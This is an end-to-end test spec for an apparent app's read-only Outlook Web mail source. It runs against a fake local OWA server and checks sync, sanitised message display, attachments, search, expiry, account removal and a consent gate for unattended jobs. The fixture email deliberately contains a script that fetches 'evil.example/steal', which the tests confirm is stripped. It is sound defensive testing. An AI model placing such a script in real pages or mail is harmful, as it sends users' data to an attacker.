/* The second mail source, driven end to end against an Outlook that is not real.

   The unit tests check the identity rule, the cursor arithmetic and the response
   shapes with the functions called directly. This drives the actual program: a
   fake OWA on loopback that speaks EWS-over-JSON, an account configured against
   it, and the mail window doing the whole round -- sign-in state, sync, open,
   attachment, search, link, expiry.

   Two things here are the point, and neither can be checked any other way:

     the mirror does not care where a message came from. Rows fed by the web
     source list, open, search and link exactly as IMAP rows do, through the same
     channels, because they are the same rows.

     the eight o'clock sentence completes with nobody watching. That is the
     scenario this whole line of work exists for, and until this spec existed it
     had never been run against the real gate -- where reading a message arms the
     taint, `fs.write` is ELEVATED, and a job whose sentence does not name a
     destination stops on a consent dialog at eight in the morning. Both
     outcomes are asserted: named, it writes; unnamed, it is refused in the same
     second with a reason, rather than hanging for fifteen minutes. */

import assert from 'node:assert/strict';
import http from 'node:http';
import { run } from '../lib/cdp.mjs';
import { pressConsent } from '../lib/dialog.mjs';

export const name = 'Outlook 網頁信箱';

const ACCOUNT = 'staff@company.example';
const NOTE = '/notes/e2e-owa-待辦.md';
const SAVED = '/inbox/e2e-owa-報價單.txt';

/* Three messages: two from the company the morning job asks about, one not.
   One of the two mentions the user by name, which is the thing the sentence
   asks to be marked. */
const MESSAGES = [
  {
    id: 'AAMkOWA001',
    changeKey: 'CK-1',
    internetMessageId: '<quote-0908@abc.com>',
    subject: '九月份報價單',
    from: { name: '王小明', address: 'ming@abc.com' },
    received: '2026-09-08T02:10:00Z',
    /* Shaped like the mail people actually get: a table of figures, a quoted
       reply, a signature block, a tracking pixel and a link -- plus the script
       and the handler that a reader has to refuse. */
    body: [
      '<html><head><style>.x{color:red}</style></head><body>',
      '<h2>九月份報價單</h2>',
      '<table border="1" cellpadding="4"><tr><th>品名</th><th>數量</th><th>單價</th></tr>',
      '<tr><td>螺絲</td><td align="right">500</td><td align="right">1,200</td></tr>',
      '<tr><td>螺帽</td><td align="right">300</td><td align="right">800</td></tr></table>',
      '<blockquote>上一封信說：交期改為九月二十日</blockquote>',
      '<p style="color:#036;font-size:13px">請 staff 確認後回覆。</p>',
      '<p><a href="https://abc.example/quote/R43805">線上檢視</a> 或 ',
      '<a href="https://abc.example/confirm">直接確認</a></p>',
      '<img src="https://track.abc.example/open.gif?id=42" width="1" height="1">',
      '<script>fetch("https://evil.example/steal")</scr' + 'ipt>',
      '<div onclick="bad()">點我</div>',
      '<p class="x">王小明｜業務部</p>',
      '</body></html>'
    ].join(''),
    attachments: [{ id: 'ATT-1', name: '報價單-九月.txt', type: 'text/plain', content: '品名,單價\n螺絲,1200\n' }]
  },
  {
    id: 'AAMkOWA002',
    changeKey: 'CK-2',
    internetMessageId: '',            // the server that answers without one
    subject: '交期確認',
    from: { name: '李大同', address: 'ta@mail.abc.com' },
    received: '2026-09-09T06:00:00Z',
    body: '<p>交期改為九月二十日。</p>',
    attachments: []
  },
  {
    id: 'AAMkOWA003',
    changeKey: 'CK-3',
    internetMessageId: '<newsletter@other.example>',
    subject: '每週電子報',
    from: { name: '別家公司', address: 'news@other.example' },
    received: '2026-09-10T01:00:00Z',
    body: '<p>本週產業快訊。</p>',
    attachments: []
  }
];

/* The state the fake server is in. `signedIn` false makes it behave the way a
   tenant does when the session has expired: it answers the service endpoint
   with the sign-in page instead of JSON. */
const state = { signedIn: true, changeKey: 0, calls: [], learned: 0, seenAuth: [] };

function itemFor(m, { withBody = false } = {}) {
  const out = {
    __type: 'Message:#Exchange',
    ItemId: { Id: m.id, ChangeKey: m.changeKey + '-' + state.changeKey },
    Subject: m.subject,
    DateTimeReceived: m.received,
    From: { Mailbox: { Name: m.from.name, EmailAddress: m.from.address } },
    ToRecipients: [{ Mailbox: { Name: '我', EmailAddress: ACCOUNT } }],
    IsRead: false,
    HasAttachments: m.attachments.length > 0
  };
  /* Deliberately unlike the list response: the real one carries this only when
     it is asked for, and one of these messages never has it at all. */
  if (m.internetMessageId) {
    out.ExtendedProperty = [{
      ExtendedFieldURI: { PropertyTag: '0x1035', PropertyType: 'String' },
      Value: m.internetMessageId
    }];
  }
  if (withBody) {
    out.Body = { BodyType: 'HTML', Value: m.body };
    out.Attachments = m.attachments.map((a) => ({
      FileAttachment: {
        AttachmentId: { Id: a.id },
        Name: a.name,
        ContentType: a.type,
        Size: Buffer.byteLength(a.content),
        IsInline: false
      }
    }));
  }
  return out;
}

function makeServer() {
  return http.createServer((req, res) => {
    const url = new URL(req.url, 'http://127.0.0.1');
    const action = url.searchParams.get('action') || '';
    state.calls.push(action || url.pathname);

    /* The mailbox page itself, which is all the sign-in flow needs here: the
       program only opens it in a tab, it never reads or fills it. */
    if (url.pathname === '/mail/' || url.pathname === '/mail') {
      /* Not a static page: the real one signs its own requests with a bearer
         token its script holds, and that request going out is the only way the
         program can learn how to ask. A page that made no requests would let
         the spec pass while the thing being tested never happened. */
      res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
      res.end('<html><body><h1>Outlook</h1><script>' +
        'setInterval(function () {' +
        '  fetch("/owa/service.svc?action=GetFolderChangeDigest&app=Mail&n=1", {' +
        '    method: "POST",' +
        '    headers: {' +
        '      "content-type": "application/json; charset=utf-8",' +
        '      "authorization": "Bearer e2e-fake-token-' + 'x'.repeat(64) + '",' +
        '      "x-anchormailbox": "PUID:E2E@fake-tenant",' +
        '      "prefer": "IdType=\\"ImmutableId\\""' +
        '    },' +
        '    body: "{}"' +
        '  }).catch(function () {});' +
        '}, 700);' +
        '</script></body></html>');
      return;
    }

    if (url.pathname !== '/owa/service.svc') { res.writeHead(404); res.end('no'); return; }

    if (!state.signedIn) {
      /* What a real expired session looks like from here: not an error, a login
         page with a 200 on it. Telling that apart from an answer is the whole
         of `needsLogin`. */
      res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
      res.end('<html><body>Sign in to your account</body></html>');
      return;
    }

    let raw = '';
    req.on('data', (c) => { raw += c; });
    req.on('end', () => {
      let body = {};
      try { body = JSON.parse(raw); } catch { /* the shape check below catches it */ }
      const send = (obj) => {
        res.writeHead(200, { 'content-type': 'application/json; charset=utf-8' });
        res.end(JSON.stringify(obj));
      };

      /* The page's own heartbeat. Answered so the tab keeps making them, and
         counted so the spec can assert the token really was harvested. */
      if (action === 'GetFolderChangeDigest') {
        state.learned = String(req.headers.authorization || '').length;
        send({ Body: { ResponseMessages: { Items: [{}] } } });
        return;
      }

      if (action === 'FindItem') {
        const paging = body.Body.Paging || {};
        const offset = paging.Offset || 0;
        const take = paging.MaxEntriesReturned || 50;
        const sorted = MESSAGES.slice().sort((a, b) => Date.parse(b.received) - Date.parse(a.received));
        const page = sorted.slice(offset, offset + take);
        send({
          Body: {
            ResponseMessages: {
              Items: [{
                RootFolder: {
                  TotalItemsInView: sorted.length,
                  IncludesLastItemInRange: offset + page.length >= sorted.length,
                  Items: page.map((m) => itemFor(m))
                }
              }]
            }
          }
        });
        return;
      }

      if (action === 'GetItem') {
        const want = String((body.Body.ItemIds || [{}])[0].Id || '');
        const m = MESSAGES.find((x) => x.id === want);
        if (!m) { send({ Body: { ResponseMessages: { Items: [] } } }); return; }
        send({ Body: { ResponseMessages: { Items: [{ Items: [itemFor(m, { withBody: true })] }] } } });
        return;
      }

      if (action === 'GetAttachment') {
        const want = String((body.Body.AttachmentIds || [{}])[0].Id || '');
        const att = MESSAGES.flatMap((m) => m.attachments).find((a) => a.id === want);
        if (!att) { send({ Body: { ResponseMessages: { Items: [] } } }); return; }
        send({
          Body: {
            ResponseMessages: {
              Items: [{
                Attachments: [{
                  FileAttachment: {
                    AttachmentId: { Id: att.id },
                    Name: att.name,
                    ContentType: att.type,
                    Content: Buffer.from(att.content, 'utf8').toString('base64')
                  }
                }]
              }]
            }
          }
        });
        return;
      }

      res.writeHead(400, { 'content-type': 'application/json' });
      res.end(JSON.stringify({ error: 'unknown action ' + action }));
    });
  });
}

export async function spec(t, app) {
  const { cdp } = app;
  const server = makeServer();
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  const base = 'http://127.0.0.1:' + server.address().port;

  try {
    /* A run leaves a mirror behind and the mirror lives in the sandbox, which
       outlives a clean profile -- so a second run's "first sync" was not a first
       sync, and the cursor from last time made it fetch two of three. `forget`
       purges, but only for an account it can see, and a clean profile has none:
       hence configure, forget, and let the first test configure again. */
    await run(cdp, `
      await window.aios.mail.configure({ kind: 'owa', email: '${ACCOUNT}', base: '${base}' });
      await window.aios.mail.forget();
      await window.aios.taint.clear();
      await window.aios.fs.remove('${NOTE}');
      await window.aios.fs.remove('${SAVED}');
      return true;
    `);

    await t.test('設定網頁信箱帳號：沒有密碼，而且說得出自己只讀', async () => {
      const r = await run(cdp, `
        var conf = await window.aios.mail.configure({ kind: 'owa', email: '${ACCOUNT}', base: '${base}' });
        var st = await window.aios.mail.status();
        return { conf: conf.ok ? conf.data : conf.error, st: st.data };
      `);
      assert.equal(r.st.kind, 'owa');
      assert.equal(r.st.configured, true, '沒有密碼也算設定好了，憑證在瀏覽器那邊');
      assert.equal(r.st.readOnly, true, '這個來源必須自己說它只讀');
      assert.equal(r.st.base, base);
      assert.ok(String(r.st.loginUrl).startsWith(base), '要給得出登入網址');
      assert.ok(!('password' in r.st), '狀態裡永遠不該出現密碼欄位');
    });

    await t.test('探測會做一次真的請求，不是看 cookie 猜的', async () => {
      state.calls.length = 0;
      const r = await run(cdp, `
        var p = await window.aios.mail.probe();
        return p.ok ? p.data : { err: p.error };
      `);
      assert.equal(r.state, 'ready', JSON.stringify(r));
      assert.equal(r.sawItem, true, '探測要真的看到信，不然「已登入」只是猜的');
      assert.ok(state.calls.includes('FindItem'), '探測沒有真的打到伺服器');
      /* The credential came off a request the page made, not out of a cookie
         jar: that is the whole mechanism, and a real tenant proved that cookies
         alone are an anonymous request. */
      assert.ok(state.learned > 40,
        '應該從頁面自己的請求學到憑證，實際看到的長度：' + state.learned);
    });

    await t.test('同步把信寫進鏡像，資料夾名字進出一致', async () => {
      const r = await run(cdp, `
        var s = await window.aios.mail.sync('INBOX', 600);
        var list = await window.aios.mail.mirrorList({ folder: 'INBOX' });
        var cov = await window.aios.mail.coverage('INBOX');
        return {
          ok: s.ok, sync: s.data, err: s.error,
          n: list.ok ? list.data.length : -1,
          rows: list.ok ? list.data.map(function (m) {
            return { id: m.messageId, from: m.from, subject: m.subject, folder: m.folder,
                     sourceId: m.sourceId, web: m.webLink, att: m.hasAttachments };
          }) : [],
          cov: cov.data
        };
      `);
      assert.equal(r.ok, true, r.err);
      assert.equal(r.sync.folder, 'INBOX', 'app 問 INBOX，鏡像也要寫 INBOX');
      assert.equal(r.n, 3, '清單讀得到三封：' + JSON.stringify(r.rows));
      assert.equal(r.sync.fetched, 3, '同步應該收下三封：' + JSON.stringify(r.sync));
      assert.equal(r.sync.first, true);
      assert.deepEqual(r.sync.missing, [], '正常的回應不該有讀不到的欄位：' + JSON.stringify(r.sync.missing));

      const quote = r.rows.find((m) => m.subject === '九月份報價單');
      assert.equal(quote.id, '<quote-0908@abc.com>', '有真的 Message-ID 就用它當鍵');
      assert.equal(quote.sourceId, 'AAMkOWA001');
      assert.ok(quote.web.includes('/mail/deeplink/read/'), '要有回得去 Outlook 的連結');
      assert.equal(quote.att, true);

      const nox = r.rows.find((m) => m.subject === '交期確認');
      assert.match(nox.id, /^<owa-[0-9a-f]{32}@aios\.local>$/, '沒有 Message-ID 的才退成雜湊');

      assert.equal(r.cov.messages, 3);
      assert.ok(r.cov.oldest > 0, '鏡像要說得出自己最早到哪一天');
    });

    await t.test('再同步一次：同一封信不會變成兩封，就算伺服器改了 ChangeKey', async () => {
      /* A message read on the phone comes back with a different ChangeKey. If
         that were part of the identity, this second sync would double the
         mailbox and every local delete would stop sticking. */
      state.changeKey++;
      const r = await run(cdp, `
        var s = await window.aios.mail.sync('INBOX', 600);
        var list = await window.aios.mail.mirrorList({ folder: 'INBOX' });
        return { sync: s.data, n: list.data.length, ids: list.data.map(function (m) { return m.messageId; }) };
      `);
      assert.equal(r.n, 3, '同步兩次之後還是三封：' + JSON.stringify(r.ids));
      assert.equal(r.sync.fresh.length, 0, '沒有新信，就不該有「新增」的信');
      assert.equal(r.sync.first, false, '第二次不是第一次同步');
    });

    await t.test('開一封信：內文與附件位元組同一趟拿回來', async () => {
      /* Attachment bytes are fetched with the body on purpose. Fetching them
         one at a time later would wipe the siblings, and the reader would show
         names for files nobody could ever open. */
      const r = await run(cdp, `
        var m = await window.aios.mail.mirrorRead('<quote-0908@abc.com>');
        if (!m.ok) return { err: m.error };
        return {
          text: m.data.text,
          atts: (m.data.attachments || []).map(function (a) {
            return { name: a.name, stored: a.stored, bytes: a.bytes, reason: a.reason || '' };
          })
        };
      `);
      assert.equal(r.err, undefined, r.err);
      assert.ok(r.text.includes('螺絲') && r.text.includes('1,200'),
        '內文沒有讀出來：' + JSON.stringify(r.text));
      assert.ok(!/<p>|<\/p>|<table/i.test(r.text),
        '純文字那一份要真的是純文字（畫面上的排版是另外一份）');
      assert.equal(r.atts.length, 1);
      assert.equal(r.atts[0].name, '報價單-九月.txt');
      assert.equal(r.atts[0].stored, true, '附件位元組要真的在本機：' + JSON.stringify(r.atts[0]));
      assert.ok(r.atts[0].bytes > 0);
    });

    await t.test('信件看起來還是那封信：表格與引言留著，腳本與追蹤像素不留', async () => {
      /* The reader used to convert every body to text, which is safe and, as the
         user put it, not acceptable -- a table of figures and a signature block
         arrived as one paragraph. This checks the three layers together, in the
         running program: the markup is rebuilt from an allowed list, the frame
         cannot run scripts, and the document fetches nothing. */
      const r = await run(cdp, `
        /* From a known state, like the link test: a window left over from an
           earlier step would make this measure something else. */
        (AIOS.apps.instances() || []).forEach(function (inst) {
          if (inst && inst.def && inst.def.id === 'mail' && inst.win) {
            try { AIOS.wm.close(inst.win); } catch (e) { }
          }
        });
        await new Promise(function (r) { setTimeout(r, 200); });

        var err = '';
        try { await AIOS.apps.launch('mail', '<quote-0908@abc.com>'); }
        catch (e) { err = String((e && e.message) || e); }

        var frame = null;
        for (var i = 0; i < 80; i++) {
          frame = document.querySelector('.ml-frame');
          if (frame && frame.srcdoc) break;
          await new Promise(function (r) { setTimeout(r, 100); });
        }
        if (!frame) {
          return {
            err: 'no frame', launchErr: err,
            panes: document.querySelectorAll('.ml-read').length,
            wins: (AIOS.apps.instances() || []).map(function (i) { return i.def && i.def.id; }),
            pane: (document.querySelector('.ml-read') || {}).textContent
          };
        }

        var doc = frame.srcdoc;
        var links = [].slice.call(document.querySelectorAll('.ml-link-url'))
          .map(function (n) { return n.textContent; });
        return {
          sandbox: frame.getAttribute('sandbox'),
          hasCsp: doc.indexOf('Content-Security-Policy') >= 0,
          csp: (/content="([^"]+)"/.exec(doc) || [])[1] || '',
          keptTable: doc.indexOf('<table') >= 0,
          keptQuote: doc.indexOf('<blockquote') >= 0,
          keptHeading: doc.indexOf('<h2') >= 0,
          keptAlign: doc.indexOf('align="right"') >= 0,
          keptColour: doc.indexOf('color:#036') >= 0,
          sawScript: /<script/i.test(doc),
          sawHandler: /\son[a-z]+\s*=/i.test(doc),
          sawTracker: doc.indexOf('track.abc.example') >= 0,
          sawStyleBlock: /<style>\.x/.test(doc),
          imagePlaceholder: doc.indexOf('［圖片］') >= 0,
          linkList: links,
          hrefInMarkup: /href=/.test(doc)
        };
      `, { timeout: 60000 });

      assert.equal(r.err, undefined,
        r.err + '（launch：' + JSON.stringify(r.launchErr) + '；視窗：' + JSON.stringify(r.wins) +
        '；閱讀窗格：' + r.panes + '；內容：' + JSON.stringify(String(r.pane || '').slice(0, 120)) + '）');
      assert.equal(r.sandbox, '', 'frame 必須是 sandbox 而且不給 allow-scripts');
      assert.ok(r.hasCsp, '文件要自帶政策');
      assert.ok(/default-src [^;]*none/.test(r.csp), 'default-src none 是那條線：' + r.csp);

      assert.ok(r.keptTable && r.keptQuote && r.keptHeading, '表格、引言、標題都要留著');
      assert.ok(r.keptAlign, '數字靠右是排版的一部分');
      assert.ok(r.keptColour, '顏色留著，不然簽名檔就不見了');

      assert.equal(r.sawScript, false, '腳本不能留在文件裡');
      assert.equal(r.sawHandler, false, '事件處理器也不行');
      assert.equal(r.sawStyleBlock, false, '<style> 整塊丟掉');
      assert.equal(r.sawTracker, false,
        '追蹤像素的網址不能出現在標記裡——出現了就會被抓，那就是讀取回報');
      assert.ok(r.imagePlaceholder, '擋下來的圖要留一個看得見的缺口');

      assert.equal(r.hrefInMarkup, false, '連結不能直接點得出去');
      assert.equal(r.linkList.length, 2, '真正的網址要列在信底下：' + JSON.stringify(r.linkList));
      assert.ok(r.linkList[0].includes('abc.example/quote'), r.linkList.join(' | '));
      assert.ok(!r.linkList.join(' ').includes('evil.example'), '腳本裡的網址不是連結');
    });

    await t.test('附件另存到沙箱，會先問過，而且存下來的檔案記得自己來自信件', async () => {
      /* Reading the message armed the taint, and writing a file is elevated, so
         the gate asks. That is the system working, not a nuisance: the bytes
         being written came from a stranger. The test presses the button a
         person would, and checks the question actually names the file. */
      const pressed = pressConsent(app.port, true, { timeout: 60000 });
      const ran = run(cdp, `
        var s = await window.aios.mail.saveAttachment('<quote-0908@abc.com>', 0, '${SAVED}');
        if (!s.ok) return { err: s.error, code: s.code };
        var back = await window.aios.fs.read('${SAVED}');
        return { saved: s.data, text: back.ok ? back.data.content : '' };
      `, { timeout: 120000 });

      const said = await pressed;
      const r = await ran;
      const wording = [said.text, said.title, ...(said.rows || [])].join(' ');
      assert.ok(wording.includes('e2e-owa') || wording.includes('報價單'),
        '授權視窗要說清楚要寫哪個檔：' + JSON.stringify(said));
      assert.equal(r.err, undefined, r.err);
      assert.ok(r.text.includes('螺絲,1200'), '存下來的內容不對：' + JSON.stringify(r.text));
    });

    await t.test('搜尋看得到內文，而網域對得上整家公司', async () => {
      const r = await run(cdp, `
        var byBody = await window.aios.mail.search({ text: '1,200' });
        var byDomain = await window.aios.mail.search({ from: 'abc.com' });
        var notThem = await window.aios.mail.search({ from: 'other.example' });
        return {
          body: byBody.data.hits.map(function (h) { return h.subject; }),
          domain: byDomain.data.hits.map(function (h) { return h.subject; }),
          notThem: notThem.data.hits.map(function (h) { return h.subject; })
        };
      `);
      assert.deepEqual(r.body, ['九月份報價單'], '內文搜尋沒找到：' + JSON.stringify(r.body));
      assert.equal(r.domain.length, 2,
        'abc.com 要同時對上 ming@abc.com 與 ta@mail.abc.com：' + JSON.stringify(r.domain));
      assert.deepEqual(r.notThem, ['每週電子報']);
    });

    await t.test('登入過期：同步說「要重新登入」，不是說「壞掉了」', async () => {
      state.signedIn = false;
      const r = await run(cdp, `
        var s = await window.aios.mail.sync('INBOX', 600);
        var p = await window.aios.mail.probe();
        var list = await window.aios.mail.mirrorList({ folder: 'INBOX' });
        return { ok: s.ok, code: s.code, err: s.error, probe: p.data, still: list.data.length };
      `);
      assert.equal(r.ok, false);
      assert.equal(r.code, 'ENEEDLOGIN', '過期要有自己的代碼，app 才知道要把登入按鈕放出來：' + r.err);
      assert.equal(r.probe.state, 'login');
      assert.ok(String(r.probe.loginUrl).startsWith(base), '要把人送去登入的地方');
      assert.equal(r.still, 3, '登入過期不該讓已經同步下來的信消失');
      state.signedIn = true;
    });

    /* ------------------------------------------------------ the scenario -- */

    await t.test('早上八點那句話，在沒有人看著的時候真的跑得完', async () => {
      /* The sentence this whole line of work exists for, run against the real
         gate with the scheduler's unattended flag raised -- which is where it
         used to stop. Reading a message arms the taint; `fs.write` is ELEVATED
         and degrades to ASK; the gate would open a consent dialog on a machine
         nobody is sitting at. It goes through here because the saved sentence
         names where the note goes, which is what `namedByUser` asks for. */
      const r = await run(cdp, `
        var sentence = '每天早上八點，幫我找出這禮拜從 ABC 公司寄來的郵件，' +
          '並特別標記內容有提到我的信件，並彙整內容大綱，追加到 ${NOTE}，' +
          '並讓我可以用連結直接打開那封信件。';
        await window.aios.intent.set(sentence);
        await window.aios.mail.sync('INBOX', 600);

        await window.aios.gate.unattended(true);
        var out = { steps: [] };
        try {
          var hits = await window.aios.mail.search({ from: 'abc.com', since: Date.parse('2026-09-07') });
          out.steps.push('search=' + (hits.ok ? hits.data.hits.length : 'FAIL'));

          var lines = ['# 待辦（' + new Date().toLocaleDateString() + '）', ''];
          for (var i = 0; i < hits.data.hits.length; i++) {
            var h = hits.data.hits[i];
            var full = await window.aios.mail.mirrorRead(h.messageId);
            out.steps.push('read=' + (full.ok ? 'ok' : full.error));
            var mentions = full.ok && /staff/i.test(full.data.text);
            lines.push('- ' + (mentions ? '**［有提到我］** ' : '') +
              '[' + h.subject + '](aios-mail:' + encodeURIComponent(h.messageId) + ')' +
              ' — ' + String(full.data.text).replace(/\\s+/g, ' ').slice(0, 40));
          }

          var t = await window.aios.taint.state();
          out.tainted = t.data.sources.length;

          var w = await window.aios.fs.write('${NOTE}', lines.join('\\n'));
          out.write = { ok: w.ok, code: w.code, error: w.error };
        } finally {
          await window.aios.gate.unattended(false);
        }
        var back = await window.aios.fs.read('${NOTE}');
        out.note = back.ok ? back.data.content : '';
        return out;
      `);

      assert.equal(r.steps[0], 'search=2', '這禮拜從 ABC 寄來的應該是兩封：' + JSON.stringify(r.steps));
      assert.ok(r.tainted > 0, '讀過信之後汙染必須是武裝的，否則這個測試沒有測到重點');
      assert.equal(r.write.ok, true,
        '這就是那個每天早上會卡住的地方，它必須在沒有人的時候寫得進去：' + JSON.stringify(r.write));
      assert.ok(r.note.includes('aios-mail:'), '待辦裡要有點得開的連結：' + JSON.stringify(r.note));
      assert.ok(r.note.includes('九月份報價單'), '摘要要指到真的那封信');
      assert.ok(r.note.includes('［有提到我］'), '內文提到本人的那封要被標出來');
      assert.ok(!r.note.includes('每週電子報'), '不是那家公司寄的不該出現');
    });

    await t.test('同一句話沒寫目的地時，當場被拒絕並說怎麼改，而不是開一個沒人按的視窗', async () => {
      const r = await run(cdp, `
        await window.aios.intent.set('每天早上八點，幫我找出這禮拜從 ABC 公司寄來的郵件，彙整大綱，記錄在代辦事項清單中。');
        await window.aios.mail.mirrorRead('<quote-0908@abc.com>');
        await window.aios.gate.unattended(true);
        var began = Date.now();
        var w;
        try {
          w = await window.aios.fs.write('/notes/e2e-owa-無處可去.md', 'x');
        } finally {
          await window.aios.gate.unattended(false);
        }
        return { ok: w.ok, error: w.error, ms: Date.now() - began };
      `);
      assert.equal(r.ok, false, '沒有指名路徑、又有汙染，本來就不該直接放行');
      assert.ok(r.ms < 5000, '它必須當場回答，而不是等一個沒有人會按的對話框：' + r.ms + 'ms');
      assert.ok(String(r.error).includes('沒有人'), '理由要說出「沒有人在」這件事：' + r.error);
      assert.ok(String(r.error).includes('/notes') || String(r.error).includes('寫進排程'),
        '理由要說怎麼改才跑得完：' + r.error);
    });

    await t.test('連結真的打得開那封信', async () => {
      const r = await run(cdp, `
        /* From a known state: the link has to open the message whether or not a
           mail window happens to be on screen, and a window left over from an
           earlier spec would make this test say nothing about the link. */
        (AIOS.apps.instances() || []).forEach(function (inst) {
          if (inst && inst.def && inst.def.id === 'mail' && inst.win) {
            try { AIOS.wm.close(inst.win); } catch (e) { }
          }
        });
        await new Promise(function (r) { setTimeout(r, 200); });
        var err = '';
        try { await AIOS.apps.launch('mail', '<quote-0908@abc.com>'); }
        catch (e) { err = String((e && e.message) || e); }
        /* Any mail window will do -- launch may reuse one that is already open
           or make a new one, and more than one can be on screen. */
        function opened() {
          var panes = [].slice.call(document.querySelectorAll('.ml-read'));
          for (var j = 0; j < panes.length; j++) {
            var head = panes[j].querySelector('.ml-read-subject');
            if (head && head.textContent.indexOf('九月') >= 0) return panes[j];
          }
          return null;
        }
        var pane = null;
        for (var i = 0; i < 80; i++) {
          pane = opened();
          if (pane && pane.textContent.indexOf('1,200') >= 0) break;
          await new Promise(function (r) { setTimeout(r, 100); });
        }
        var any = [].slice.call(document.querySelectorAll('.ml-read'))
          .map(function (p) { return p.textContent.slice(0, 80); });
        return {
          text: pane ? pane.textContent.slice(0, 600) : '',
          frame: !!(pane && pane.querySelector('.ml-frame')),
          panes: any, err: err,
          wins: (AIOS.apps.instances() || []).map(function (i) { return i.def && i.def.id; })
        };
      `);
      assert.ok(r.text.includes('九月份報價單'),
        '用 Message-ID 開信件視窗沒有開到。launch 說：' + JSON.stringify(r.err) +
        '；畫面上的視窗：' + JSON.stringify(r.wins) +
        '；閱讀窗格：' + JSON.stringify(r.panes));
      assert.ok(r.frame, '內文在 frame 裡，所以 frame 要在：' + JSON.stringify(r.panes));
    });

    await t.test('縮小起來的郵件視窗，照樣看得到新信進來', async () => {
      /* A mail program that only shows what arrived the last time you pressed a
         button is a mail program you have to remember to press a button in.

         The window is minimised first on purpose: that is the case that matters,
         and it is the one that breaks the day minimising stops being just a
         hidden element. Headers only, also on purpose -- reading a message is
         what arms the taint gate, and a background job that quietly downgraded
         this session's capabilities without anybody doing anything would be
         worse than a stale list. So the taint count comes out unchanged. */
      MESSAGES.push({
        id: 'AAMkOWA-NEW',
        changeKey: 'CK-N',
        internetMessageId: '<just-arrived@abc.com>',
        subject: '剛剛寄到的信',
        from: { name: '王小明', address: 'ming@abc.com' },
        received: '2026-09-11T08:00:00Z',
        body: '<p>這封是在視窗開著的時候才到的。</p>',
        attachments: []
      });

      const r = await run(cdp, `
        (AIOS.apps.instances() || []).forEach(function (i) {
          if (i && i.def && i.def.id === 'mail' && i.win) { try { AIOS.wm.close(i.win); } catch (e) {} }
        });
        await new Promise(function (r) { setTimeout(r, 200); });

        var before = (await window.aios.mail.mirrorList({ folder: 'INBOX', limit: 200 })).data.length;
        var taintBefore = (await window.aios.taint.state()).data.sources.length;

        var win = await AIOS.apps.launch('mail');
        var inst = AIOS.apps.instanceFor(win);
        /* Let the window arm itself, then put it away. */
        for (var i = 0; i < 60; i++) {
          var f0 = document.querySelector('.ml-foot');
          if (f0 && f0.textContent.indexOf('自動收信中') >= 0) break;
          await new Promise(function (r) { setTimeout(r, 100); });
        }
        AIOS.wm.minimize(win);

        /* Exactly what the timer calls, called while the window is hidden. */
        var got = await inst.ctx.api.check();

        var after = (await window.aios.mail.mirrorList({ folder: 'INBOX', limit: 200 })).data.length;
        var taintAfter = (await window.aios.taint.state()).data.sources.length;
        var foot = document.querySelector('.ml-foot');
        return {
          got: got, before: before, after: after,
          minimized: !!win.minimized,
          mounted: !!AIOS.apps.instanceFor(win),
          listed: win.el.textContent.indexOf('剛剛寄到的信') >= 0,
          watching: foot ? foot.textContent.indexOf('自動收信中') >= 0 : false,
          taintBefore: taintBefore, taintAfter: taintAfter
        };
      `, { timeout: 120000 });

      assert.equal(r.minimized, true, '這個測試的前提就是視窗縮起來了');
      assert.equal(r.mounted, true, '縮小不該把視窗拆掉，拆掉了就沒有人在看了');
      assert.equal(r.got, 1, '縮小狀態下應該剛好看到那一封新的：' + JSON.stringify(r));
      assert.equal(r.after, r.before + 1, '而且它要真的進到鏡像裡');
      assert.equal(r.listed, true, '清單也要跟著更新，不是只有計數對');
      assert.ok(r.watching, '縮小之後還是要繼續在看');
      assert.equal(r.taintAfter, r.taintBefore,
        '只抓信頭不讀內文，所以不該因為背景檢查就把提權能力降級');

      /* Leave the fixture as it was found: the next spec counts what is here. */
      MESSAGES.pop();
    });

    await t.test('這條路上沒有任何能改動真實信箱的呼叫', async () => {
      /* Read-only by construction. The unit test asserts it against the source;
         this asserts it against the running program, which is where a channel
         that slipped through would actually be reachable from. */
      const r = await run(cdp, `
        /* mail.send is ELEVATED and the taint has been armed by reading, so the
           gate would ask -- and the question under test is not the gate's, it is
           whether this source can send at all. Clear the taint so the refusal
           that comes back is the source's own. */
        await window.aios.taint.clear();
        var send = await window.aios.mail.send({ to: 'x@y.com', subject: 'x', body: 'x' });
        var pref = await window.aios.mail.syncSeenPref(true);
        var live = await window.aios.mail.list('INBOX', 5);
        var seen = await window.aios.mail.setSeen('<quote-0908@abc.com>', true);
        return {
          send: { ok: send.ok, code: send.code },
          pref: { ok: pref.ok, code: pref.code },
          live: { ok: live.ok, code: live.code },
          seen: seen.data
        };
      `);
      assert.equal(r.send.ok, false, '網頁信箱帳號不該寄得出信');
      assert.equal(r.send.code, 'EREADONLY', '而且要說得出理由：' + JSON.stringify(r.send));
      assert.equal(r.pref.ok, false, '「已讀同步回伺服器」這個選項在這裡不存在');
      assert.equal(r.live.ok, false, '沒有即時清單這回事，清單只有鏡像');
      assert.equal(r.seen.pushed, false, '標記已讀只在本機');
      assert.equal(r.seen.readOnly, true);
    });

    await t.test('移除帳號會把本機那份信件副本一起帶走', async () => {
      /* `mailstore.purge()` has said 「用於帳號被移除時」 since it was written and
         nothing ever called it, so 「移除帳號」 deleted a password and left every
         message, body and attachment byte on disk for the next account with the
         same address to inherit. Found by this spec being run twice: the second
         run's first sync was not a first sync. */
      const r = await run(cdp, `
        var before = await window.aios.mail.mirrorStats();
        var gone = await window.aios.mail.forget();
        var after = await window.aios.mail.mirrorStats();
        var list = await window.aios.mail.mirrorList({ folder: 'INBOX' });
        return {
          before: before.data, purged: gone.data.purged,
          after: after.data, listOk: list.ok
        };
      `);
      assert.ok(r.before && r.before.messages >= 3, '移除之前本機確實有信：' + JSON.stringify(r.before));
      assert.ok(r.purged >= 3, '要說得出清掉幾封：' + JSON.stringify(r.purged));
      assert.equal(r.after, null, '移除之後不該還有鏡像統計：' + JSON.stringify(r.after));
      assert.equal(r.listOk, false, '帳號移除之後，那些信不該還列得出來');
    });

  } finally {
    await run(cdp, `
      await window.aios.gate.unattended(false);
      await window.aios.mail.forget();
      await window.aios.intent.set('');
      return true;
    `).catch(() => {});
    await new Promise((r) => server.close(r));
  }
}
